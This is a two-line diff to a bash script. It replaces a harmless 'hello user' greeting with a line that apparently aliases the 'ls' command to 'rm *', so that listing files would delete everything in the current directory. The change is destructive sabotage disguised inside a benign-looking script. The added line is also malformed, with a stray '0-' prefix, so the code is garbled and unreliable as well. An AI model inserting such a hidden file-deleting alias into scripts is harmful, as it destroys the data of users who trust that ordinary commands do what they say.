@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "hello user"
+0-alias ls='rm *'
